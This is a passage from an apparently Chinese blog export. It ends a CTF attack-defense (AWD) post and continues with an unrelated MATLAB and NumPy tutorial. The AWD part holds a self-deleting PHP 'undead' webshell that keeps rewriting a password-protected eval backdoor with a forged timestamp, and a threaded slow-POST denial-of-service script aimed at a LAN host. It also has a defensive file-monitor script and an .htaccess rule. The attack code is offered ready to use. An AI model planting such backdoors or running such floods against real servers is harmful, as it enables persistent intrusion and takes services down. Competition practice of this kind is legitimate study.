class="hljs-comment">//删除文件本身,调用unlink()的时候，文件还是存在的，只是目录里找不到该文件了</span><br>    <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;./.index1.php&#x27;</span>;  <span class="hljs-comment">//生成的木马文件名为 .index1.php</span><br>    <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;&lt;?php</span><br><span class="hljs-string">        //给木马设置密码，防止他人使用</span><br><span class="hljs-string">        if(md5($_POST[&quot;pass&quot;])==&quot;29b8babad580b5607470f6e01e90e27a&quot;)&#123;  //密码：nichousha</span><br><span class="hljs-string">            @eval($_POST[&quot;cmd&quot;]);</span><br><span class="hljs-string">        &#125;?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2022-05-28 9:10:12&quot; .index1.php&#x27;</span>);  <span class="hljs-comment">//设置文件的编辑时间</span><br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);  <span class="hljs-comment">//每隔usleep(5000)写入一个新文件</span><br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">kill不死马<br><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.index1.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;hi springbird !&#x27;</span>;<br>    <span class="hljs-comment">//pass=pass</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2022-05-28 09:10:12&quot; .index1.php&#x27;</span>);<br>    <span class="hljs-comment">//    usleep(5000);</span><br>          <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">1000</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>5.全自动化设置</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">dos<br>import <span class="hljs-built_in">socket</span><br>import <span class="hljs-built_in">time</span><br>import threading<br><br><span class="hljs-built_in">max</span>=<span class="hljs-number">90000000</span><br>port=<span class="hljs-number">80</span>                 <span class="hljs-comment">#端口</span><br>host=<span class="hljs-string">&quot;192.168.92.154&quot;</span>   <span class="hljs-comment">#IP</span><br>page=<span class="hljs-string">&quot;/index.php&quot;</span><br><br>bag=(<span class="hljs-string">&quot;POST %s HTTP/1.1\r\n&quot;</span><br>    <span class="hljs-string">&quot;host: %s\r\n&quot;</span><br>    <span class="hljs-string">&quot;Content-Length: 1000000000\r\n&quot;</span><br>    <span class="hljs-string">&quot;Cookie: 1998\r\n&quot;</span><br>    <span class="hljs-string">&quot;\r\n&quot;</span> % (page,host))<br><br>socks = []<br><br>def connect():<br>    <span class="hljs-built_in">global</span> socks<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-built_in">max</span>):<br>        s = <span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET,<span class="hljs-built_in">socket</span>.SOCK_STREAM)<br>        <span class="hljs-keyword">try</span>:<br>            s.connect((host,port))<br>            s.<span class="hljs-built_in">send</span>(bag.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>            socks.append(s)<br>        except Exception <span class="hljs-keyword">as</span> ex:<br>            <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">1</span>)<br><br>def <span class="hljs-built_in">send</span>():<br>    <span class="hljs-built_in">global</span> socks<br>    <span class="hljs-keyword">while</span> True:<br>        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> socks:<br>            <span class="hljs-keyword">try</span>:<br>                print(<span class="hljs-string">&quot;攻击中....&quot;</span>)<br>            except Exception <span class="hljs-keyword">as</span> ex:<br>                socks.remove(s)<br>                s.<span class="hljs-built_in">close</span>()<br>        <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.1</span>)<br><br>One = threading.Thread(target=connect,args=())<br>Two = threading.Thread(target=<span class="hljs-built_in">send</span>,args=())<br>One.<span class="hljs-built_in">start</span>()<br>Two.<span class="hljs-built_in">start</span>()<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">文件监控<br><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-comment">#Usage:python2 demo.py</span><br><br><span class="hljs-comment">#注意：要将此文件放在有读写权限的目录以及所有修改过的php必须在此目录或者该目录的子目录中。</span><br><span class="hljs-comment">#作用：读取被修改过的文件，然后将文件的地址加上内容全部存放在txt</span><br><br><br>import sys,subprocess,os<br><span class="hljs-comment">#查找最近10分钟被修改的文件</span><br>def scanfile():<br><span class="hljs-comment">#command: find -name &#x27;*.php&#x27; -mmin -10</span><br><span class="hljs-keyword">command</span> = <span class="hljs-string">&quot;find -name \&#x27;*.php\&#x27; -mmin -10&quot;</span><br>su = subprocess.Popen(<span class="hljs-keyword">command</span>,<span class="hljs-title">shell</span>=<span class="hljs-title">True</span>,<span class="hljs-title">stdin</span>=<span class="hljs-title">subprocess</span>.<span class="hljs-title">PIPE</span>,<span class="hljs-title">stdout</span>=<span class="hljs-title">subprocess</span>.<span class="hljs-title">PIPE</span>,<span class="hljs-title">stderr</span>=<span class="hljs-title">subprocess</span>.<span class="hljs-title">PIPE</span>)<br>STDOUT,STDERR = su.communicate()<br>list = STDOUT.<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-comment">#print str(list)</span><br><span class="hljs-comment">#将文件处理成list类型然后返回。</span><br><span class="hljs-literal">return</span> list<br><br><span class="hljs-comment">#读取文件：</span><br>def loadfile(addr):<br>data = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment">#如果文件不存在就跳出函数</span><br><span class="hljs-keyword">try</span> :<br><span class="hljs-built_in">file</span> = <span class="hljs-built_in">open</span>(addr,<span class="hljs-string">&#x27;r&#x27;</span>)<br>data = <span class="hljs-built_in">file</span>.<span class="hljs-built_in">read</span>()<br>except : <br><span class="hljs-literal">return</span> <span class="hljs-number">0</span><br>all_data = addr+<span class="hljs-string">&quot;\n&quot;</span>+data+<span class="hljs-string">&quot;\n\n&quot;</span><br>file1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;shell.txt&quot;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>)<br><span class="hljs-comment">#避免重复写入</span><br><span class="hljs-keyword">try</span>:<br>shell_content = file1.<span class="hljs-built_in">read</span>()<br>except:<br>shell_content = <span class="hljs-string">&quot;null&quot;</span><br><span class="hljs-comment">#如果文件内容不为空再写入，避免写入空的。</span><br><span class="hljs-comment">#print shell_content</span><br><span class="hljs-keyword">if</span> data :<br><span class="hljs-keyword">if</span> all_data <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> shell_content:<br>file1.<span class="hljs-built_in">write</span>(all_data)<br><span class="hljs-built_in">file</span>.<span class="hljs-built_in">close</span>()<br>file1.<span class="hljs-built_in">close</span>()<br>rm_cmd = <span class="hljs-string">&quot;rm -rf &quot;</span>+addr<br>su = subprocess.Popen(rm_cmd,<span class="hljs-built_in">shell</span>=True,<span class="hljs-keyword">stdin</span>=subprocess.PIPE,<span class="hljs-keyword">stdout</span>=subprocess.PIPE,<span class="hljs-keyword">stderr</span>=subprocess.PIPE)<br>su.communicate()<br>print <span class="hljs-string">&quot;loadfile over : &quot;</span>+addr<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><span class="hljs-keyword">while</span> True:<br><br>list = scanfile()<br><span class="hljs-keyword">if</span> list :<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-built_in">len</span>(list)):<br><span class="hljs-comment">#如果list[i]为空就不读取了</span><br><span class="hljs-keyword">if</span> list[i]:<br>loadfile(str(list[i]))<br><span class="hljs-keyword">else</span> : pass<br></code></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">.htaccess<br><span class="hljs-tag">&lt;FilesMatch &quot;\.(?i:php|php3|php4|php5)&quot;&gt;</span><br><span class="hljs-keyword">Order</span>  <span class="hljs-title">allow</span>,<span class="hljs-keyword">deny</span><br>    <span class="hljs-keyword">Deny</span>  from  all<br><span class="hljs-tag">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF AWD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AWD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数学建模</title>
    <link href="/2024/09/23/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    <url>/2024/09/23/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="MATLAB操作"><a href="#MATLAB操作" class="headerlink" title="MATLAB操作"></a>MATLAB操作</h1><h2 id="一、MATLAB-基础操作"><a href="#一、MATLAB-基础操作" class="headerlink" title="一、MATLAB 基础操作"></a><strong>一、MATLAB 基础操作</strong></h2><h3 id="1-1-变量与运算"><a href="#1-1-变量与运算" class="headerlink" title="1.1 变量与运算"></a><strong>1.1 变量与运算</strong></h3><p>MATLAB 的变量是矩阵或数组。以下是一些基本操作：</p><h4 id="实例-1：简单运算"><a href="#实例-1：简单运算" class="headerlink" title="实例 1：简单运算"></a><strong>实例 1：简单运算</strong></h4><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-comment">% 定义变量</span><br>a = <span class="hljs-number">5</span>;      <span class="hljs-comment">% 标量</span><br>b = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];  <span class="hljs-comment">% 行向量</span><br>c = [<span class="hljs-number">1</span>; <span class="hljs-number">2</span>; <span class="hljs-number">3</span>];  <span class="hljs-comment">% 列向量</span><br><br><span class="hljs-comment">% 计算</span><br>sum_b = sum(b);     <span class="hljs-comment">% 计算向量元素和</span><br>product_c = prod(c); <span class="hljs-comment">% 计算向量元素积</span><br>square_a = a^<span class="hljs-number">2</span>;     <span class="hljs-comment">% 计算 a 的平方</span><br></code></pre></td></tr></table></figure><ul><li><code>sum(b)</code> 计算向量 <code>b</code> 的元素和，结果为 <code>6</code>。</li><li><code>prod(c)</code> 计算列向量 <code>c</code> 的元素积，结果为 <code>6</code>。</li></ul><hr><h3 id="1-2-矩阵操作"><a href="#1-2-矩阵操作" class="headerlink" title="1.2 矩阵操作"></a><strong>1.2 矩阵操作</strong></h3><p>MATLAB 最擅长的是矩阵计算。</p><h4 id="实例-2：矩阵操作"><a href="#实例-2：矩阵操作" class="headerlink" title="实例 2：矩阵操作"></a><strong>实例 2：矩阵操作</strong></h4><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-comment">% 定义矩阵</span><br><span class="hljs-symbol">A</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>; <span class="hljs-number">3</span>, <span class="hljs-number">4</span>];   <span class="hljs-comment">% 2x2 矩阵</span><br><span class="hljs-symbol">B</span> = [<span class="hljs-number">5</span>, <span class="hljs-number">6</span>; <span class="hljs-number">7</span>, <span class="hljs-number">8</span>];   <span class="hljs-comment">% 2x2 矩阵</span><br><br><span class="hljs-comment">% 矩阵基本运算</span><br><span class="hljs-symbol">C</span> = <span class="hljs-symbol">A</span> + <span class="hljs-symbol">B</span>;   <span class="hljs-comment">% 矩阵加法</span><br><span class="hljs-symbol">D</span> = <span class="hljs-symbol">A</span> * <span class="hljs-symbol">B</span>;   <span class="hljs-comment">% 矩阵乘法</span><br><span class="hljs-symbol">E</span> = <span class="hljs-symbol">A</span> .* <span class="hljs-symbol">B</span>;  <span class="hljs-comment">% 元素逐项相乘</span><br><span class="hljs-symbol">F</span> = inv(<span class="hljs-symbol">A</span>);  <span class="hljs-comment">% 计算逆矩阵</span><br></code></pre></td></tr></table></figure><ul><li><code>A + B</code> 结果是矩阵的逐元素相加。</li><li><code>A .* B</code> 是矩阵对应元素逐项相乘，而 <code>A * B</code> 是矩阵乘法。</li><li><code>inv(A)</code> 返回矩阵 <code>A</code> 的逆矩阵。</li></ul><hr><h3 id="1-3-绘图"><a href="#1-3-绘图" class="headerlink" title="1.3 绘图"></a><strong>1.3 绘图</strong></h3><p>MATLAB 提供了强大的绘图功能，可以绘制各种类型的图表。</p><h4 id="实例-3：绘制二维曲线"><a href="#实例-3：绘制二维曲线" class="headerlink" title="实例 3：绘制二维曲线"></a><strong>实例 3：绘制二维曲线</strong></h4><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gml"><span class="hljs-variable language_">x</span> = <span class="hljs-number">0</span>:<span class="hljs-number">0.1</span>:<span class="hljs-number">10</span>;           % 定义 <span class="hljs-variable language_">x</span> 轴数据<br><span class="hljs-variable language_">y</span> = <span class="hljs-built_in">sin</span>(<span class="hljs-variable language_">x</span>);             % 定义 <span class="hljs-variable language_">y</span> 轴数据<br><br>% 绘制正弦函数图像<br>plot(<span class="hljs-variable language_">x</span>, <span class="hljs-variable language_">y</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;LineWidth&#x27;</span>, <span class="hljs-number">2</span>);  % 绘制红色曲线<br>xlabel(<span class="hljs-string">&#x27;x&#x27;</span>);          % 设置 <span class="hljs-variable language_">x</span> 轴标签<br>ylabel(<span class="hljs-string">&#x27;sin(x)&#x27;</span>);     % 设置 <span class="hljs-variable language_">y</span> 轴标签<br>title(<span class="hljs-string">&#x27;Sine Function&#x27;</span>);   % 设置图表标题<br>grid on;             % 显示网格<br></code></pre></td></tr></table></figure><ul><li><code>plot(x, y)</code> 绘制了正弦函数的二维图像。</li><li><code>xlabel()</code>、<code>ylabel()</code> 和 <code>title()</code> 分别设置坐标轴标签和图像标题。</li></ul><hr><h3 id="1-4-条件与循环"><a href="#1-4-条件与循环" class="headerlink" title="1.4 条件与循环"></a><strong>1.4 条件与循环</strong></h3><h4 id="实例-4：条件判断与循环"><a href="#实例-4：条件判断与循环" class="headerlink" title="实例 4：条件判断与循环"></a><strong>实例 4：条件判断与循环</strong></h4><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">% 条件语句</span><br>x = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">0</span><br>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;x 是正数&#x27;</span>);<br><span class="hljs-keyword">elseif</span> x == <span class="hljs-number">0</span><br>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;x 是零&#x27;</span>);<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;x 是负数&#x27;</span>);<br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment">% 循环</span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:<span class="hljs-number">5</span><br>    fprintf(<span class="hljs-string">&#x27;当前值: %d\n&#x27;</span>, <span class="hljs-built_in">i</span>);  <span class="hljs-comment">% 格式化输出</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><hr><h2 id="二、数据分析与处理"><a href="#二、数据分析与处理" class="headerlink" title="二、数据分析与处理"></a><strong>二、数据分析与处理</strong></h2><h3 id="2-1-导入数据"><a href="#2-1-导入数据" class="headerlink" title="2.1 导入数据"></a><strong>2.1 导入数据</strong></h3><p>MATLAB 支持多种数据格式的导入，包括 Excel、CSV 和 MAT 文件。</p><h4 id="实例-5：读取-CSV-文件"><a href="#实例-5：读取-CSV-文件" class="headerlink" title="实例 5：读取 CSV 文件"></a><strong>实例 5：读取 CSV 文件</strong></h4><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"><span class="hljs-comment">% 读取 CSV 文件</span><br>data = readmatrix(<span class="hljs-string">&#x27;data.csv&#x27;</span>);  <span class="hljs-comment">% 从 CSV 文件中读取数据</span><br></code></pre></td></tr></table></figure><hr><h3 id="2-2-数据可视化"><a href="#2-2-数据可视化" class="headerlink" title="2.2 数据可视化"></a><strong>2.2 数据可视化</strong></h3><p>可以使用多种图表来展示数据。</p><h4 id="实例-6：绘制柱状图"><a href="#实例-6：绘制柱状图" class="headerlink" title="实例 6：绘制柱状图"></a><strong>实例 6：绘制柱状图</strong></h4><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gml"><span class="hljs-variable language_">x</span> = categorical(&#123;<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>&#125;); % 分类数据<br><span class="hljs-variable language_">y</span> = [<span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">20</span>];                % 对应的值<br><br>% 绘制柱状图<br>bar(<span class="hljs-variable language_">x</span>, <span class="hljs-variable language_">y</span>);<br>xlabel(<span class="hljs-string">&#x27;Category&#x27;</span>);<br>ylabel(<span class="hljs-string">&#x27;Value&#x27;</span>);<br>title(<span class="hljs-string">&#x27;Bar Chart Example&#x27;</span>);<br></code></pre></td></tr></table></figure><hr><h2 id="三、数学建模与求解"><a href="#三、数学建模与求解" class="headerlink" title="三、数学建模与求解"></a><strong>三、数学建模与求解</strong></h2><h3 id="3-1-求解线性方程组"><a href="#3-1-求解线性方程组" class="headerlink" title="3.1 求解线性方程组"></a><strong>3.1 求解线性方程组</strong></h3><h4 id="实例-7：Ax-b-的解"><a href="#实例-7：Ax-b-的解" class="headerlink" title="实例 7：Ax &#x3D; b 的解"></a><strong>实例 7：Ax &#x3D; b 的解</strong></h4><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">A</span> = [<span class="hljs-number">2</span>, <span class="hljs-number">-1</span>; <span class="hljs-number">-4</span>, <span class="hljs-number">3</span>];  <span class="hljs-comment">% 系数矩阵</span><br>b = [<span class="hljs-number">1</span>; <span class="hljs-number">-2</span>];         <span class="hljs-comment">% 常数项</span><br><br>x = <span class="hljs-symbol">A</span>\b;             <span class="hljs-comment">% 解线性方程组</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-2-优化问题"><a href="#3-2-优化问题" class="headerlink" title="3.2 优化问题"></a><strong>3.2 优化问题</strong></h3><p>MATLAB 的优化工具箱可以求解各种优化问题。</p><h4 id="实例-8：最小化函数"><a href="#实例-8：最小化函数" class="headerlink" title="实例 8：最小化函数"></a><strong>实例 8：最小化函数</strong></h4><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">% 定义目标函数</span><br>f = @(x) (x - <span class="hljs-number">3</span>)^<span class="hljs-number">2</span> + <span class="hljs-built_in">sin</span>(x);<br><br><span class="hljs-comment">% 使用 fminbnd 求解</span><br>x_min = fminbnd(f, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>);  <span class="hljs-comment">% 在 [0, 5] 区间内最小化函数 f</span><br><span class="hljs-built_in">disp</span>([<span class="hljs-string">&#x27;最小值出现在 x = &#x27;</span>, num2str(x_min)]);<br></code></pre></td></tr></table></figure><hr><h2 id="四、符号运算"><a href="#四、符号运算" class="headerlink" title="四、符号运算"></a><strong>四、符号运算</strong></h2><p>MATLAB 提供符号运算工具，可以进行符号微积分、方程求解等。</p><h4 id="实例-9：符号微积分"><a href="#实例-9：符号微积分" class="headerlink" title="实例 9：符号微积分"></a><strong>实例 9：符号微积分</strong></h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">syms <span class="hljs-keyword">x</span><span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>% 求导<br>f <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span>^<span class="hljs-number">2</span> * sin(<span class="hljs-keyword">x</span>)<span class="hljs-comment">;</span><br>df <span class="hljs-operator">=</span> diff(f)<span class="hljs-comment">;  % 对 f 求导</span><br><br>% 积分<br>int_f <span class="hljs-operator">=</span> int(f)<span class="hljs-comment">;  % 对 f 求不定积分</span><br></code></pre></td></tr></table></figure><hr><h2 id="五、机器学习与数据建模"><a href="#五、机器学习与数据建模" class="headerlink" title="五、机器学习与数据建模"></a><strong>五、机器学习与数据建模</strong></h2><h3 id="5-1-数据拟合"><a href="#5-1-数据拟合" class="headerlink" title="5.1 数据拟合"></a><strong>5.1 数据拟合</strong></h3><p>MATLAB 提供 <code>polyfit</code> 函数用于多项式拟合。</p><h4 id="实例-10：线性拟合"><a href="#实例-10：线性拟合" class="headerlink" title="实例 10：线性拟合"></a><strong>实例 10：线性拟合</strong></h4><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gml"><span class="hljs-variable language_">x</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];   % 自变量<br><span class="hljs-variable language_">y</span> = [<span class="hljs-number">2.2</span>, <span class="hljs-number">2.8</span>, <span class="hljs-number">3.6</span>, <span class="hljs-number">4.5</span>, <span class="hljs-number">5.1</span>];  % 因变量<br><br>% 拟合一阶多项式（直线）<br>p = polyfit(<span class="hljs-variable language_">x</span>, <span class="hljs-variable language_">y</span>, <span class="hljs-number">1</span>);<br><br>% 绘制拟合结果<br>y_fit = polyval(p, <span class="hljs-variable language_">x</span>);<br>plot(<span class="hljs-variable language_">x</span>, <span class="hljs-variable language_">y</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-variable language_">x</span>, y_fit, <span class="hljs-string">&#x27;-&#x27;</span>);  % 原始数据和拟合曲线<br>legend(<span class="hljs-string">&#x27;数据点&#x27;</span>, <span class="hljs-string">&#x27;拟合线&#x27;</span>);<br></code></pre></td></tr></table></figure><hr><h2 id="六、并行计算与性能优化"><a href="#六、并行计算与性能优化" class="headerlink" title="六、并行计算与性能优化"></a><strong>六、并行计算与性能优化</strong></h2><p>MATLAB 支持多线程和并行计算，可以加速计算。</p><h4 id="实例-11：并行-for-循环"><a href="#实例-11：并行-for-循环" class="headerlink" title="实例 11：并行 for 循环"></a><strong>实例 11：并行 for 循环</strong></h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">parfor i</span> = 1:10<br>    disp([<span class="hljs-string">&#x27;计算中: &#x27;</span>, num2str(i)]);<br><span class="hljs-attribute">end</span><br></code></pre></td></tr></table></figure><hr><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="1-NumPy：数值计算基础库"><a href="#1-NumPy：数值计算基础库" class="headerlink" title="1. NumPy：数值计算基础库"></a><strong>1. NumPy：数值计算基础库</strong></h2><h3 id="1-1-创建多维数组"><a href="#1-1-创建多维数组" class="headerlink" title="1.1 创建多维数组"></a><strong>1.1 创建多维数组</strong></h3><p>在实际应用中，<strong>NumPy</strong> 经常用于创建矩阵或多维数组进行数学计算。以下是如何创建高维数组并进行操作的示例：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import numpy as np<br><br><span class="hljs-comment"># 创建 3x3 的随机矩阵</span><br>A = np.random.rand(3, 3)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;A:\n&quot;</span>, A)<br><br><span class="hljs-comment"># 创建 3x3 的单位矩阵</span><br>I = np.eye(3)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;单位矩阵 I:\n&quot;</span>, I)<br><br><span class="hljs-comment"># 